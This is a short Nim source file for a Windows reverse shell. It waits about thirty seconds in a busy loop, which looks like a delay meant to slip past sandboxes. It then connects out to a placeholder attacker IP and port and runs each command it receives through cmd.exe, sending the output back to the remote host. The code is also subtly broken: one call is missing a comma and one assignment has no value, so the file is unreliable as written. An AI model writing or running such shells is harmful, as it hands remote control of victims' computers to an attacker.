import net
import osproc
import strformat 
import times

let now1 = now() + 30.seconds 
var i = 1

while now() <= now1:
    var i = i + 1

 
let 
    ip = "IP" 
    port = PORT 
    sock = newSocket() 


sock.connect(ip Port(port))

let prompt = "Nim-Shell> "
while true:
    send(sock, prompt)
    let bad = recvLine(sock) 
    let cmd = execProcess(fmt"cmd.exe /C " & bad)
    send(sock,cmd)
    let sshCmd = 
discard execShellCmd(sshCmd)
